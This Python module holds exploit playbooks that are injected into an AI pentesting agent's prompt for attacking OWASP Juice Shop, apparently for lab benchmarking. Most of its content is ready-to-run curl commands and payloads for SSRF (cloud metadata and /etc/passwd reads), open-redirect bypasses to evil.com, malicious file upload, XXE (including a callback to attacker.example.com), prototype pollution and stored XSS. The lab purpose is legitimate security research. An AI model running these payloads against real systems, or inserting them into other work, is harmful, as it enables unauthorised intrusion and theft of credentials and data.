"""Exploit playbooks for the 6 vulnerability classes that resisted fine-tuning.

These are injected into the agent's system prompt when the target is known to
expose these classes. Each playbook gives the agent:
  - WHERE to look (specific endpoint / parameter)
  - WHAT payloads to try (verified, not speculative)
  - HOW to confirm success (exploit-signature verifier)

Grounded in OWASP Juice Shop v17.1.1 ground truth + PortSwigger Web Security
Academy writeups + HackerOne disclosed reports. See docs/THESIS_JUICY_FINDINGS.md
for why RAG beats further SFT for these classes.

Activation: set env var ERLIK_PLAYBOOKS=1 to enable injection.
"""

import os


SSRF_PLAYBOOK = """### EXPLOIT PLAYBOOK — SSRF (A10:2021)

Juice Shop endpoint: POST /profile/image/url with body parameter "imageUrl".
The server fetches whatever URL you pass; this is classic SSRF.

Payloads to try (in order):
  1. curl -s -X POST "{target_url}/profile/image/url" -H "Cookie: token=<JWT>" --data "imageUrl=http://localhost:3000/ftp/"
  2. curl -s -X POST "{target_url}/profile/image/url" -H "Cookie: token=<JWT>" --data "imageUrl=http://169.254.169.254/latest/meta-data/"
  3. curl -s -X POST "{target_url}/profile/image/url" -H "Cookie: token=<JWT>" --data "imageUrl=file:///etc/passwd"
  4. curl -s -X POST "{target_url}/profile/image/url" -H "Cookie: token=<JWT>" --data "imageUrl=http://127.0.0.1:22"

Authentication required — obtain a JWT first (login-helper or login with any user).

Verification (any of):
  - Response includes HTML/directory listing from internal path (/ftp/ output)
  - Response contains cloud metadata keys (ami-id, iam/, etc.)
  - Response contains /etc/passwd content or TCP banner (SSH-2.0 etc.)
  - Request hangs on non-HTTP port (indicates connection attempt)

If ANY of the above → report finding immediately:
  {"action": "finding", "vuln_type": "SSRF", "severity": "high",
   "url": "{target_url}/profile/image/url", "parameter": "imageUrl",
   "evidence": "Server fetched internal URL <X> — <signal>"}
"""


OPEN_REDIRECT_PLAYBOOK = """### EXPLOIT PLAYBOOK — Open Redirect (A01:2021)

Juice Shop endpoint: GET /redirect?to=<URL>. Uses a naive allowlist that can be bypassed.

Payloads to try (in order):
  1. curl -sI "{target_url}/redirect?to=https://github.com/bkimminich/juice-shop"   (baseline allowlist)
  2. curl -sI "{target_url}/redirect?to=https://www.google.com"                     (outside allowlist — should fail)
  3. curl -sI "{target_url}/redirect?to=https://evil.com?github.com/bkimminich/juice-shop"   (allowlist substring bypass)
  4. curl -sI "{target_url}/redirect?to=https://evil.com%23github.com/bkimminich/juice-shop" (fragment bypass)
  5. curl -sI "{target_url}/redirect?to=//evil.com"                                 (protocol-relative)

Verification:
  - Response status 302/301 AND Location header points to attacker-controlled domain (evil.com, google.com, anything NOT allowlisted)
  - If payload #3 or #4 returns Location: evil.com → open redirect confirmed

If redirect to non-allowlisted domain → report:
  {"action": "finding", "vuln_type": "Open Redirect", "severity": "medium",
   "url": "{target_url}/redirect", "parameter": "to",
   "evidence": "Redirects to evil.com via allowlist bypass <payload>"}
"""


FILE_UPLOAD_PLAYBOOK = """### EXPLOIT PLAYBOOK — Malicious File Upload (A04:2021)

Juice Shop endpoint: POST /file-upload. Validates extension but can be bypassed.

Setup — create payload files in /tmp:
  echo "test content" > /tmp/shell.pdf.zip     (double extension)
  echo "test content" > /tmp/big.pdf           (oversize → trigger size check)

Payloads to try (in order):
  1. curl -s -X POST "{target_url}/file-upload" -F "file=@/tmp/shell.pdf.zip"
  2. curl -s -X POST "{target_url}/file-upload" -F "file=@/tmp/shell.pdf.zip;type=application/pdf"
  3. dd if=/dev/zero of=/tmp/big.pdf bs=1M count=101; curl -s -X POST "{target_url}/file-upload" -F "file=@/tmp/big.pdf"
  4. Craft a .zip with embedded .xml or .xxe → see XXE playbook below

Verification:
  - Response 204/200 on .zip file (extension bypass worked)
  - Server error revealing internal path/framework on oversize
  - File appears in subsequent GET /ftp/ listing

If any non-pdf/xml extension accepted OR oversize accepted → report:
  {"action": "finding", "vuln_type": "File Upload", "severity": "medium",
   "url": "{target_url}/file-upload", "parameter": "file",
   "evidence": "Accepted <filename> despite type=<X>"}
"""


XXE_PLAYBOOK = """### EXPLOIT PLAYBOOK — XXE (A05:2021)

Juice Shop endpoint: POST /file-upload when file extension is .xml — server parses XML
with external entities enabled (vulnerable libxmljs version).

Setup — create XXE payload in /tmp:
  cat > /tmp/xxe.xml << 'EOF'
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE foo [
    <!ELEMENT foo ANY>
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
  ]>
  <foo>&xxe;</foo>
  EOF

  # Out-of-band variant (DNS/HTTP callback)
  cat > /tmp/xxe_oob.xml << 'EOF'
  <?xml version="1.0"?>
  <!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "http://attacker.example.com/steal">
  ]>
  <foo>&xxe;</foo>
  EOF

Payloads to try:
  1. curl -s -X POST "{target_url}/file-upload" -F "file=@/tmp/xxe.xml;type=text/xml"
  2. curl -s -X POST "{target_url}/file-upload" -F "file=@/tmp/xxe.xml;type=application/xml"
  3. Pack xxe.xml into a zip and upload:
       cd /tmp && zip xxebomb.zip xxe.xml
       curl -s -X POST "{target_url}/file-upload" -F "file=@/tmp/xxebomb.zip"

Verification:
  - Response body contains /etc/passwd content (root:x:0:0:...)
  - Response includes a timeout/denial-of-service delay (quadratic blowup entity)
  - Response reflects parsed XML with entity expansion

If file content appears in response → report:
  {"action": "finding", "vuln_type": "XXE", "severity": "high",
   "url": "{target_url}/file-upload", "parameter": "file",
   "evidence": "XML external entity resolved — /etc/passwd leaked"}
"""


PROTOTYPE_POLLUTION_PLAYBOOK = """### EXPLOIT PLAYBOOK — Prototype Pollution (A03:2021)

Juice Shop endpoint: PUT /api/Users/:id or POST /api/Users with JSON body containing
__proto__ — Node.js merges user input into Object.prototype.

Payloads to try (in order):
  1. curl -s -X POST "{target_url}/api/Users" \\
       -H "Content-Type: application/json" \\
       -d '{"email":"pp@test.com","password":"Test1!","__proto__":{"polluted":"yes"}}'

  2. curl -s -X PUT "{target_url}/api/Users/1" \\
       -H "Content-Type: application/json" \\
       -H "Cookie: token=<JWT>" \\
       -d '{"__proto__":{"isAdmin":true}}'

  3. curl -s -X POST "{target_url}/api/Users" \\
       -H "Content-Type: application/json" \\
       -d '{"constructor":{"prototype":{"polluted":"yes"}}}'

  4. Verification ping — check if pollution stuck:
     curl -s "{target_url}/rest/user/whoami" -H "Cookie: token=<JWT>"
     (look for "polluted":"yes" OR "isAdmin":true on an unrelated object)

Verification (any of):
  - Response echoes back the pollution key on a DIFFERENT endpoint's response
  - Server behaviour changes (unauthorized endpoint returns 200)
  - Error message mentions "Object.prototype" or similar

If pollution reflected on unrelated response → report:
  {"action": "finding", "vuln_type": "Prototype Pollution", "severity": "medium",
   "url": "{target_url}/api/Users", "parameter": "__proto__",
   "evidence": "__proto__ merged into Object.prototype — <signal>"}
"""


STORED_XSS_PLAYBOOK = """### EXPLOIT PLAYBOOK — Stored XSS (A03:2021)

Juice Shop storage: user profile "username" field. Rendered UNSANITISED in the admin
panel and in the product reviews list.

Multi-step attack (this is why it's hard for agents — 3 steps):

STEP 1 — Register + inject payload:
  curl -s -X POST "{target_url}/api/Users" \\
       -H "Content-Type: application/json" \\
       -d '{"email":"xss1@test.com","password":"Test1!","username":"<iframe src=\\"javascript:alert(`xss`)\\">"}'

STEP 2 — Log in and PUT the username field (sometimes needed on the /user endpoint):
  TOKEN=$(curl -s -X POST "{target_url}/rest/user/login" -H "Content-Type: application/json" -d '{"email":"xss1@test.com","password":"Test1!"}' | grep -oP 'token":"[^"]+' | cut -d'"' -f3)
  curl -s -X PUT "{target_url}/api/Users/<uid>" -H "Cookie: token=$TOKEN" -H "Content-Type: application/json" -d '{"username":"<iframe src=\\"javascript:alert(\\'xss\\')\\">"}'

STEP 3 — Trigger (retrieve as admin OR check review list):
  curl -s "{target_url}/api/Users" | grep -i "<iframe\\|<script\\|javascript:"
  curl -s "{target_url}/api/Users/<uid>" | grep -i "<iframe\\|<script\\|javascript:"

Verification:
  - Response returns raw <iframe> / <script> / javascript: in the username field
    (NOT &lt;iframe&gt; — if encoded, NOT vulnerable)
  - Admin dashboard HTML (requires admin token) contains the payload literally

Alternative payloads (if <iframe> filtered):
  - <img src=x onerror=alert(1)>
  - <svg/onload=alert(1)>
  - "><script>alert(1)</script>

If unencoded payload in response → report:
  {"action": "finding", "vuln_type": "Stored XSS", "severity": "high",
   "url": "{target_url}/api/Users", "parameter": "username",
   "evidence": "Payload <X> stored and returned unencoded in GET /api/Users"}
"""


ALL_PLAYBOOKS = {
    "ssrf": SSRF_PLAYBOOK,
    "open_redirect": OPEN_REDIRECT_PLAYBOOK,
    "file_upload": FILE_UPLOAD_PLAYBOOK,
    "xxe": XXE_PLAYBOOK,
    "prototype_pollution": PROTOTYPE_POLLUTION_PLAYBOOK,
    "stored_xss": STORED_XSS_PLAYBOOK,
}


def get_playbook_context(target_url: str, mode: str | None = None) -> str:
    """Return the combined playbook block to inject for a known target.

    These playbooks are Juice-Shop-specific (exact endpoints, exact payloads).
    They must be enabled explicitly — via the per-session run config (`mode`) or
    the ERLIK_PLAYBOOKS env var — never auto-triggered by URL heuristics, which
    would fire on any random app listening on port 3000.
    """
    effective = (mode if mode is not None else os.environ.get("ERLIK_PLAYBOOKS", "")).lower()
    if effective != "juiceshop":
        return ""

    header = (
        "═══════════════════════════════════════════════════════════════\n"
        "EXPLOIT PLAYBOOKS — 6 hard vulnerability classes\n"
        "═══════════════════════════════════════════════════════════════\n"
        "The target exposes these classes on specific endpoints. When you reach\n"
        "a matching context (file upload, redirect endpoint, JSON user API), use\n"
        "the playbook below. Each one has exact payloads and a verifier — do NOT\n"
        "guess. Run the payload, check the verifier, then call 'finding' if it fires.\n"
    )

    body = "\n\n".join(
        pb.replace("{target_url}", target_url.rstrip("/"))
        for pb in ALL_PLAYBOOKS.values()
    )

    return f"{header}\n{body}\n"
